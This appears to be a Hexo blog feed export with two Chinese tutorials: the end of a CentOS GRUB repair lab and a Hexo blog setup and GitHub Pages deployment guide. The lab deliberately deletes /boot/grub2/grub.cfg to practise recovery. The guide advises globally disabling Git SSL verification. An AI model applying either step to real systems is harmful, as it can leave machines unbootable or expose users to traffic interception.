<li><strong>grub2-install 命令重建 Bootloader，随后 sync 写入硬盘，reboot 重启系统</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-4.2<span class="comment"># chroot /mnt/sysimage</span></span><br><span class="line">sh-4.2<span class="comment"># grub2-install /dev/sda</span></span><br><span class="line">sh-4.2<span class="comment"># sync</span></span><br><span class="line">sh-4.2<span class="comment"># exit</span></span><br><span class="line">sh-4.2<span class="comment"># reboot</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>重启后，可正常进入开机引导</strong></li>
</ul>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525191143114.png" alt="image-20220525191143114"></p>
<h2 id="五-修复GRUB"><a href="#五-修复GRUB" class="headerlink" title="五. 修复GRUB"></a>五. 修复GRUB</h2><p>**若grub配置文件丢失，开机会直接进入 grub 界面，显示为 grub&gt; **</p>
<p><strong>由于 grub2 的文件极其复杂，所以一定要做好备份</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line">磁盘 /dev/sda：107.4 GB, 107374182400 字节，209715200 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0x00000000</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048     2099199     1048576   83  Linux</span><br><span class="line">/dev/sda2         2099200   209715199   103808000   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-root：53.7 GB, 53687091200 字节，104857600 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-swap：4160 MB, 4160749568 字节，8126464 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-home：48.4 GB, 48444211200 字节，94617600 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># lsblk</span></span><br><span class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda               8:0    0  100G  0 disk </span><br><span class="line">├─sda1            8:1    0    1G  0 part /boot</span><br><span class="line">└─sda2            8:2    0   99G  0 part </span><br><span class="line">  ├─centos-root 253:0    0   50G  0 lvm  /</span><br><span class="line">  ├─centos-swap 253:1    0  3.9G  0 lvm  [SWAP]</span><br><span class="line">  └─centos-home 253:2    0 45.1G  0 lvm  /home</span><br><span class="line">sr0              11:0    1  4.4G  0 rom  /run/media/root/CentOS 7 x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先备份，再破坏</span></span><br><span class="line">[root@localhost ~]<span class="comment"># mkdir grub2.bak</span></span><br><span class="line">[root@localhost ~]<span class="comment"># chmod 600 grub2.bak/</span></span><br><span class="line">[root@localhost ~]<span class="comment"># cp -rp /boot/grub2/* ./grub2.bak/</span></span><br><span class="line">[root@localhost ~]<span class="comment"># ls grub2.bak/</span></span><br><span class="line">device.map fonts grub.cfg grubenv i386-pc locale</span><br><span class="line"><span class="comment"># 破坏</span></span><br><span class="line">[root@localhost ~]<span class="comment"># rm /boot/grub2/grub.cfg</span></span><br><span class="line"><span class="built_in">rm</span>：是否删除普通文件 <span class="string">&quot;/boot/grub2/grub.cfg&quot;</span>？y</span><br><span class="line">[root@localhost ~]<span class="comment"># reboot</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525191903755.png" alt="image-20220525191903755"></p>
<ul>
<li><strong>重启后，进入 “ grub&gt; ” 状态，输入以下命令设置启动参数</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub&gt; insmod xfs</span><br><span class="line"><span class="comment"># 第0块磁盘的第1个分区</span></span><br><span class="line">grub&gt; <span class="built_in">set</span> root=<span class="string">&#x27;hd0,1&#x27;</span></span><br><span class="line"><span class="comment"># 内核文件</span></span><br><span class="line"><span class="comment"># mapper是逻辑卷组</span></span><br><span class="line">grub&gt; linux16 /vmlinuz-3.10.0-229.el7.x86_64</span><br><span class="line">root=/dev/mapper/centos-root</span><br><span class="line">grub&gt; initrd16 /initramfs-3.10.0-229.el7.x86_64.img</span><br><span class="line">grub&gt; boot</span><br></pre></td></tr></table></figure>

<p><strong>恢复grub</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cp ./grub2.bak/grub.cfg /boot/grub2/</span></span><br><span class="line">[root@localhost ~]<span class="comment"># reboot</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>GRUB</tag>
      </tags>
  </entry>
  <entry>
    <title>软考之网络工程师认证</title>
    <url>/2023/06/04/%E8%BD%AF%E8%80%83%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>搭建我的hexo博客</title>
    <url>/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>目前，互联网资源的普及，已经可以让每人搭建独立搭一个个人博客了；这边就教大家怎么搭建Hexo并配置。大家可以参考<a href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a>配合使用。</strong></p>
<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><h2 id="Windows端"><a href="#Windows端" class="headerlink" title="Windows端"></a>Windows端</h2><p><strong>安装：</strong></p>
<ol>
<li><a href="https://nodejs.org/en/">Node.js</a></li>
<li><a href="https://git-scm.com/">Git</a></li>
</ol>
<p><strong>在我们的日常开发中经常会遇到这种情况：手上有好几个项目，每个项目的需求不同，进而不同项目必须依赖不同版的 <code>NodeJS</code> 运行环境。如果没有一个合适的工具，这个问题将非常棘手。所以<code>nvm</code>应运而生。</strong></p>
<p><strong>而我们传统的安装<code> NodeJS</code>的方法很容易出现错误，而且配置起来也特别麻烦，所以我们采用<code>nvm</code>这个项目管理工具来配合我们安装博客会更加的丝滑而且几乎没有报错的可能，读者也可以根据自己喜欢的版本无缝切换。</strong></p>
<p><strong>Windows下配置<a href="https://github.com/coreybutler/nvm-windows">NVM</a>：</strong></p>
<h2 id="安装NVM"><a href="#安装NVM" class="headerlink" title="安装NVM"></a>安装NVM</h2><p><strong>进入NVM-Windows项目发布地址：</strong> <a href="https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a> <strong>，选择最新发行版本<code>nvm-setup.zip</code>下载：</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710000533630.png" alt="image-20220710000533630"></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710000654131.png" alt="image-20220710000654131"></p>
<p><strong>安装完成后，</strong></p>
<p>在搜索栏查找<code>poweshell</code>,选中<code>x86</code>的<code>powershell</code>鼠标右击选择<code>以管理员身份运行</code>。</p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20221127134846193.png" alt="image-20221127134846193"></p>
<p><strong>在<code>Powershell</code>下，输入<code>NVM</code>，即可发现安装完成：</strong></p>
<h2 id="配置国内源"><a href="#配置国内源" class="headerlink" title="配置国内源"></a>配置国内源</h2><p><strong>中国大陆这边连接<code>Node.js</code>和<code>NPM</code>官方服务器有点困难，甚至不单单是下载慢了，有时候直接无法下载使用。所以我们换<code>NVM</code>和<code>Node.js</code>成国内源：</strong></p>
<p><strong>到你<code>NVM</code>安装路径，（我的默认安装在：C:\Users\orange\AppData\Roaming\nvm，那么你如果是默认安装的话，里面的orange要改成你自己的用户名）打开<code>setting.txt</code>文件（如果没有，则创建即可），更改：</strong></p>
<p><strong>注意不要照抄文档配置，要根据自己的安装路径写入对应配置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root: C:\Users\orange\AppData\Roaming\nvm</span><br><span class="line">path: C:\Program Files\nodejs</span><br><span class="line"><span class="built_in">arch</span>: 64</span><br><span class="line">proxy: none</span><br><span class="line">node_mirror: https://npm.taobao.org/mirrors/node/</span><br><span class="line">npm_mirror: https://npm.taobao.org/mirrors/npm/</span><br></pre></td></tr></table></figure>

<p><strong>这里解释一下参数：</strong></p>
<ul>
<li><strong>root：NVM的安装地址。即上文的<code>%NVM_HOME%</code></strong></li>
<li><strong>path：激活node.js时的存储路径，即上文的<code>%NVM_SYMLINK%</code></strong></li>
<li><strong>arch：系统架构，如果你的Windwos不是<code>x64</code>，则填<code>32</code></strong></li>
<li><strong>proxy：是否走代理</strong></li>
<li><strong>node_mirror：node.js的下载源，这里使用的是淘宝源</strong></li>
<li><strong>npm_mirror：npm的下载源，这里使用的是淘宝源</strong></li>
</ul>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230308210424315.png" alt="image-20230308210424315"></p>
<h1 id="管理与安装Node-js"><a href="#管理与安装Node-js" class="headerlink" title="管理与安装Node.js"></a>管理与安装Node.js</h1><h2 id="查看已经版本"><a href="#查看已经版本" class="headerlink" title="查看已经版本"></a>查看已经版本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvm list</span><br></pre></td></tr></table></figure>

<p><strong>查看已经安装的版本：</strong></p>
<p><strong>这里我已经安装了16.15.1版本的node.js,如果你是刚刚安装好的，那么这里将是空白一片</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710001705412.png" alt="image-20220710001705412"></p>
<p>如图：</p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/Snipaste_2022-11-28_14-01-24.png" alt="Snipaste_2022-11-28_14-01-24"></p>
<h2 id="查看可安装版本"><a href="#查看可安装版本" class="headerlink" title="查看可安装版本"></a>查看可安装版本</h2><p><strong>如何查看通过NVM安装的Node.js版本呢？</strong><br><strong>你可以直接使用NVM命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">nvm list available</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710002047715.png" alt="image-20220710002047715"></p>
<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p><strong>我们安装16.15.1版本node.js：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvm install 16.15.1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710002225007.png" alt="image-20220710002225007"></p>
<h2 id="激活Node-js版本"><a href="#激活Node-js版本" class="headerlink" title="激活Node.js版本"></a>激活Node.js版本</h2><p><strong>我们安装好Node.js以后，需要激活它</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nvm use 16.15.1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710002353777.png" alt="image-20220710002353777"></p>
<p><strong>然后我们发现出现这堆乱码，其实是因为我们没有用管理员权限的<code>powershell</code>,用管理员的身份打开<code>powershell</code>再来一次即可生效。</strong></p>
<h1 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h1><p><strong>很简单，无脑下一步！！！</strong></p>
<p><a href="https://git-scm.com/">Git的官网地址</a> <strong>给你们啦！！！</strong></p>
<h1 id="安装和管理Hexo博客"><a href="#安装和管理Hexo博客" class="headerlink" title="安装和管理Hexo博客"></a>安装和管理Hexo博客</h1><h2 id="使用Npm安装Hexo"><a href="#使用Npm安装Hexo" class="headerlink" title="使用Npm安装Hexo"></a>使用Npm安装Hexo</h2><p><strong>因为<code>Node</code>里自带<code>Npm</code>，所以我们可以直接使用<code>Npm</code>；这一步，总的来说，就是：<code>npm install -g hexo</code>；<em>为了方便国内用户，提前加了一步更换npm为腾讯云源，非大陆用户可以跳过</em>，Windows用户打开<code>cmd</code>或<code>powershell</code>输入:</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">npm config set registry http:<span class="regexp">//mi</span>rrors.cloud.tencent.com<span class="regexp">/npm/</span></span><br></pre></td></tr></table></figure>

<p><strong>然后安装<code>hexo-cli</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; node -v</span><br><span class="line">v16.15.1</span><br><span class="line">PS C:\WINDOWS\system32&gt; npm install hexo-cli --location=global</span><br><span class="line">npm WARN config global `--global`, `--<span class="built_in">local</span>` are deprecated. Use `--location=global` instead.</span><br><span class="line"></span><br><span class="line">added 59 packages, and audited 60 packages <span class="keyword">in</span> 58s</span><br><span class="line"></span><br><span class="line">14 packages are looking <span class="keyword">for</span> funding</span><br><span class="line">  run `npm fund` <span class="keyword">for</span> details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line">npm notice</span><br><span class="line">npm notice New minor version of npm available! 8.11.0 -&gt; 8.13.2</span><br><span class="line">npm notice Changelog: https://github.com/npm/cli/releases/tag/v8.13.2</span><br><span class="line">npm notice Run npm install -g npm@8.13.2 to update!</span><br><span class="line">npm notice</span><br></pre></td></tr></table></figure>

<p>如果出现这个错误</p>
<p>更新一下npm就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm-windows-upgrade</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set-ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170</span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm-windows-upgrade</span><br><span class="line">npm-windows-upgrade v6.0.1</span><br><span class="line">? Which version <span class="keyword">do</span> you want to install? 8.13.2</span><br><span class="line">Checked system <span class="keyword">for</span> npm installation:</span><br><span class="line">According to PowerShell: D:\nodejs</span><br><span class="line">According to npm:        D:\nodejs</span><br><span class="line">Decided that npm is installed <span class="keyword">in</span> D:\nodejs</span><br><span class="line">Upgrading npm... |</span><br><span class="line"></span><br><span class="line">Upgrade finished. Your new npm version is 8.13.2. Have a <span class="built_in">nice</span> day!</span><br></pre></td></tr></table></figure>

<p><strong>更新完成之后就能顺利安装成功hexo了</strong></p>
<p><strong>安装好以后，测试一下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710004601578.png" alt="image-20220710004601578"></p>
<p><strong>没有出现未知命令，说明安装成功。可以接下来操作了。</strong></p>
<p><strong>如果出现hexo : 无法加载文件 C:\Program Files\nodejs\hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.micros oft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies。 所在位置 行:1 字符: 1。</strong></p>
<p><strong>那是因为你用的是win11系统，你需要在<code>设置-&gt;隐私和安全性-&gt;开发者选项-&gt;允许本地powershell脚本在为签名的情况下运行</code></strong></p>
<p><strong>如图：</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230308210045396.png" alt="image-20230308210045396"></p>
<p><strong>应用之后，重新打开新的powershell，再次输入hexo即可。</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230308210149994.png" alt="image-20230308210149994"></p>
<h2 id="创建Hexo"><a href="#创建Hexo" class="headerlink" title="创建Hexo"></a>创建Hexo</h2><p><strong>因为我们已经安装好Git，所以我们直接是由鼠标右键的<code>Git Bash Here</code>，然后在你喜欢的一个盘符里面创建一个文件夹并且命名。</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710233249939.png" alt="image-20220710233249939"></p>
<p><strong>这里我在D盘创建了个orange的目录，以后我就在里面书写我的博客了，这个目录的文件非常重要，要记得备份哦。。。。。。</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710233151967.png" alt="image-20220710233151967"></p>
<p><strong>刚刚我们已经切换到<code>orange</code>目录，后续操作均在<code>orange</code>目录内进行。确保：</strong></p>
<ul>
<li><strong>Windows用户确保<code>cmd</code>或<code>powershell</code>运行目录在刚刚创建的的<code>orange</code>文件夹内；</strong></li>
<li><strong>注意⚠️：这个目录，日后就是是博客运行目录了。记得备份该文件夹。</strong></li>
</ul>
<h3 id="在目录内初始化博客"><a href="#在目录内初始化博客" class="headerlink" title="在目录内初始化博客"></a>在目录内初始化博客</h3><p><strong>初始化orange目录：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进目录之后，在Git bash里面输入下面目录初始化</span></span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710233936892.png" alt="image-20220710233936892"></p>
<p><strong>输入命令后，它会自动爬取hexo的初始化目录，在国内网络是非常不好的，如果出错需要删除目录内容重新执行命令直到成功。</strong></p>
<h2 id="构建Hexo"><a href="#构建Hexo" class="headerlink" title="构建Hexo"></a>构建Hexo</h2><p><strong>初始化Hexo后，其实Hexo就可以使用了；构建Hexo：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p><strong>会在当前目录下生成一个叫<code>public</code>的文件夹，这个文件夹就是根据你<code>Hexo</code>的配置，生成的HTML+CSS+JS的静态文件了。</strong></p>
<h2 id="启动Hexo内建服务器"><a href="#启动Hexo内建服务器" class="headerlink" title="启动Hexo内建服务器"></a>启动Hexo内建服务器</h2><p><strong>其实，整个<code>public</code>文件就是一个博客了，但是我们还要部署<code>Nginx</code>等网络环境或者使用<code>HBuilderX</code>等根据，启动Web服务器才能用浏览器本地IP(即：<code>127.0.0.1</code>或<code>localhost</code>)加端口进行访问；为了减少麻烦，可以使用Hexo内建服务器：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710234306097.png" alt="image-20220710234306097"></p>
<p><strong>我们可以去<code>127.0.0.1:4000</code>网址看看初始化页面的样子</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710234335015.png" alt="image-20220710234335015"></p>
<h1 id="部署Hexo到远程平台"><a href="#部署Hexo到远程平台" class="headerlink" title="部署Hexo到远程平台"></a>部署Hexo到远程平台</h1><p><strong>上述操作，我们已经把<code>Hexo</code>部署在本地；接下来，我们来看看怎么部署到远程平台，部署到远程平台后，公网用户就可以访问了（也就是可以让你小伙伴通过浏览器访问到你的博客）。</strong></p>
<h2 id="部署Hexo到GitHub"><a href="#部署Hexo到GitHub" class="headerlink" title="部署Hexo到GitHub"></a>部署Hexo到GitHub</h2><h3 id="GitHub创建仓库"><a href="#GitHub创建仓库" class="headerlink" title="GitHub创建仓库"></a>GitHub创建仓库</h3><p><strong>到Github上创建仓库</strong></p>
<p><strong>注意：为了能通过 &lt;你的 GitHub 用户名&gt;.github.io 域名访问，你的仓库（repository） 应该直接命名为:</strong><br><strong>&lt;你的 GitHub 用户名&gt;.github.io</strong></p>
<p><strong>比如：你的用户名叫：Demo；</strong><br><strong>那么，你就创建一个仓库叫：Demo.github.io</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710234923191.png" alt="image-20220710234923191"></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710234953614.png" alt="image-20220710234953614"></p>
<p><strong>GitHub现在新的仓库，分支为main，而Hexo默认用master分支。所以创建好后进入仓库，看看是什么分支：</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710235020234.png" alt="image-20220710235020234"></p>
<p><strong>我的博客已经推送过一次了，现在是<code>master</code>，接下来先安装博客里面的git，让我们的博客拥有推送的能力</strong></p>
<h3 id="本地安装hexo-deployer-git"><a href="#本地安装hexo-deployer-git" class="headerlink" title="本地安装hexo-deployer-git"></a>本地安装hexo-deployer-git</h3><p><strong>在博客目录内，使用命令窗口&#x2F;终端输入：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注意这些插件是安装在博客目录内的，所以是跟随博客内容一起走的</span></span><br><span class="line"><span class="comment">#这个插件是提供上传git能力</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h3 id="修改博客主配置文件"><a href="#修改博客主配置文件" class="headerlink" title="修改博客主配置文件"></a>修改博客主配置文件</h3><p><strong>打开博客目录下的<code>_config.yml</code>文件，编辑（这边的可以用记事本），type后的’ ‘,填’git’，然后补上其他内容：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面这个网址是我的github的一个链接</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:julintongxue/julintongxue.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710235512404.png" alt="image-20220710235512404"></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220710235652501.png" alt="image-20220710235652501"></p>
<p><strong>复制HTTPS或者SSH都可以，除了网址你填自己的之外，其他的要和我的符合一致哦</strong></p>
<h2 id="博客推送"><a href="#博客推送" class="headerlink" title="博客推送"></a>博客推送</h2><p><strong>在博客目录下命令窗口&#x2F;终端输入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;your_email&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your_name&quot;</span></span><br><span class="line"><span class="comment"># hexo d就是推送博客到指定的地方(本博客推送的地方是Github)</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p><strong>会弹出一个github的登陆框，登录上你自己的github即可</strong></p>
<p><strong>然后你访问</strong></p>
<p><strong><code>&lt;你的 GitHub 用户名&gt;.github.io</code>这个网址就出现你的hexo网站了，你的博客生涯正式开始。。。</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220711001206320.png" alt="image-20220711001206320"></p>
<p><strong>配一下ssh公钥验证，这样每次推送就不用次次登录一次Github账号密码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>一路下一步之后，找到你c盘下的用户，找到一个.ssh的隐藏文件夹，在里面有个<code>id_rsa.pub</code>文件，把里面内容复制到github的账户设置里面的ssh验证</strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20220711000855560.png" alt="image-20220711000855560"></p>
<p><strong>因为github在国外，有些时候推送会出现ssl出错，其实就是网络差，我们在Git Bash里面输入下面这行命令，不验证ssl：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.sslVerify <span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="博客美化"><a href="#博客美化" class="headerlink" title="博客美化"></a>博客美化</h1><p><strong>很显然，刚刚装好的博客，丑的一批，啥都没有，那么怎么把这个丑丑的博客改造成为下图那样干净、整洁还有二次元味道捏<del>(￣▽￣)</del></strong>*</p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230401005302966.png" alt="image-20230401005302966"></p>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p><strong>更换主题</strong></p>
<p><strong>在博客根目录下，打开git bash，然后克隆代码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next-reloaded</span><br></pre></td></tr></table></figure>

<p><strong>然后修改博客根目录下的全局配置文件<code>_config.yml</code>将<code>theme</code>后面的字母改为<code>your_theme_name</code>,即<code>next-reloaded</code></strong></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230401130703259.png" alt="image-20230401130703259"></p>
<h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><h2 id="主题菜单"><a href="#主题菜单" class="headerlink" title="主题菜单"></a>主题菜单</h2><h2 id="隐藏网页底部"><a href="#隐藏网页底部" class="headerlink" title="隐藏网页底部"></a>隐藏网页底部</h2><h2 id="网易云音乐外链"><a href="#网易云音乐外链" class="headerlink" title="网易云音乐外链"></a>网易云音乐外链</h2><h2 id="看板娘-初音未来"><a href="#看板娘-初音未来" class="headerlink" title="看板娘-初音未来"></a>看板娘-初音未来</h2><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>在安装配置node时，cmd检查node没问题</p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413013508753.png" alt="image-20230413013508753"></p>
<p> 但是检查npm就出现<code>npm WARN config global </code>–global<code>, </code>–local<code>are deprecated. Use</code>–location&#x3D;global<code> instead.</code></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413013542955.png" alt="image-20230413013542955"></p>
<p>我们就要来到nvm的路径找到里面的v16.15.1的node的文件夹<code>C:\Users\orange\AppData\Roaming\nvm\v16.15.1</code></p>
<p>我们需要修改两个文件<code>npm</code>和<code>npm.cmd</code></p>
<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413013913294.png" alt="image-20230413013913294"></p>
<p>将npm文件的<strong>第23行</strong>，修改成下图样式，命令如下，可以直接粘贴</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix --location=global</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/09/%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84hexo%E5%8D%9A%E5%AE%A2/image-20230413014025801.png" alt="image-20230413014025801"></p>
